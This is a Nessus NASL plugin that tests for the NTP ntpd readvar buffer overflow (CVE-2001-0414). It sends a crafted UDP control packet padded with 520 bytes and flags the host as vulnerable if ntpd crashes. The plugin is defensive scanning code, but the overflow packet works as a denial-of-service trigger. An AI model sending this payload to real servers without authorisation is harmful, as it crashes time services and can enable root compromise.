#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if(description)
{
 script_id(10647);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2001-0414");
 script_bugtraq_id(2540);
 script_xref(name:"OSVDB", value:"805");
 
 script_name(english:"NTP ntpd readvar Variable Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote host through the NTP
server." );
 script_set_attribute(attribute:"description", value:
"The remote NTP server was vulnerable to a buffer overflow attack which
allows anyone to use it to execute arbitrary code as root." );
 script_set_attribute(attribute:"solution", value:
"Disable this service if you do not use it, or upgrade." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english:"crashes the remote ntpd");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencies("ntp_open.nasl");
 script_require_keys("NTP/Running");
 exit(0);
}

include("global_settings.inc");

if (report_paranoia < 2) exit(0);


function ntp_installed()
{
local_var data, r, soc;

data = raw_string(0xDB, 0x00, 0x04, 0xFA, 0x00, 0x01,
    		  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0xBE, 0x78, 0x2F, 0x1D, 0x19, 0xBA,
		  0x00, 0x00);

soc = open_sock_udp(123);
send(socket:soc, data:data);
r = recv(socket:soc, length:4096);
close(soc);
if(strlen(r) > 10)
 {
 return(1);
 }
return(0);
}

if(!(get_udp_port_state(123)))exit(0);


if(ntp_installed())
{
soc = open_sock_udp(123);
buf = raw_string(0x16, 0x02, 0x00, 0x01, 0x00, 0x00,
    		 0x00, 0x00, 0x00, 0x00, 0x01, 0x36, 0x73, 0x74,
		 0x72, 0x61, 0x74, 0x75, 0x6D, 0x3D) + crap(520);

send(socket:soc, data:buf);


buf = raw_string(0x16, 0x02, 0x00, 0x02, 0x00, 0x00,
    		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

send(socket:soc, data:buf);
close(soc);
if(!(ntp_installed()))security_hole(port:123, protocol:"udp");
}
